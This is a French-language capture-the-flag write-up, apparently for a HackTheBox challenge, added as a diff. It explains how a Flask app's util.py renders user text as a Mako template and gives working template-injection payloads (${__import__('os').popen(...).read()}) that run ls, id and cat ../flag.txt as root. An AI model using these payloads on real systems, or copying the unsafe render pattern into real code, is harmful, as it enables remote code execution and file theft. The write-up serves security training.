@@ -1,0 +1,66 @@
+Structure de l'application
+En examinant les fichiers fournis :
+- main.py : Application Flask avec Mako Templates
+- routes.py : Route unique qui accepte le paramètre GET text
+- util.py : Contient la logique de conversion avec 4 polices différentes
+- run.py : Script de lancement du serveur
+
+Point d'entrée vulnérable
+- La route principale dans routes.py :
+
+@web.route('/')
+def index():
+    text = request.args.get('text')
+    if(text):
+        converted = spookify(text)
+        return render_template('index.html',output=converted)
+    return render_template('index.html',output='')
+
+- Le texte utilisateur est passé à la fonction spookify() sans aucune validation.
+
+Vulnérabilité dans util.py
+La fonction critique se trouve dans util.py :
+
+def generate_render(converted_fonts):
+    result = '''
+        <tr>
+            <td>{0}</td>
+        </tr>
+        <tr>
+            <td>{1}</td>
+        </tr>
+        <tr>
+            <td>{2}</td>
+        </tr>
+        <tr>
+            <td>{3}</td>
+        </tr>
+    '''.format(*converted_fonts)
+    
+    return Template(result).render()
+
+- Problème : Les textes convertis sont insérés directement dans un template Mako via .format() et le template est rendu avec .render(). Ca permet l'injection de code Mako.
+
+Exploitation
+Étape 1 : Confirmation de la vulnérabilité
+
+- Test d'injection de template Mako simple : ${7*7} 
+( Le résultat devrait afficher "49" si la vulnérabilité existe.)
+
+Étape 2 : Exécution de code arbitraire
+Dans Mako, on peut importer des modules Python et exécuter du code. Le payload utilisé : ${__import__('os').popen('ls -la').read()}
+- Cela a confirmé que nous pouvions exécuter des commandes système.
+
+Étape 3 : Exploration du système
+- Vérification des privilèges : ${__import__('os').popen('id').read()}
+- Résultat : uid=0(root) gid=0(root) - Nous avons un accès root complet.
+
+Exploration du système de fichiers :
+- ${__import__('os').popen('ls -la').read()}
+
+Étape 4 : Recherche du flag [...]
+
+- Après avoir exploré le système, le flag était situé dans le répertoire parent :
+${__import__('os').popen('cat ../flag.txt').read()}
+
+Flag : HTB{...}
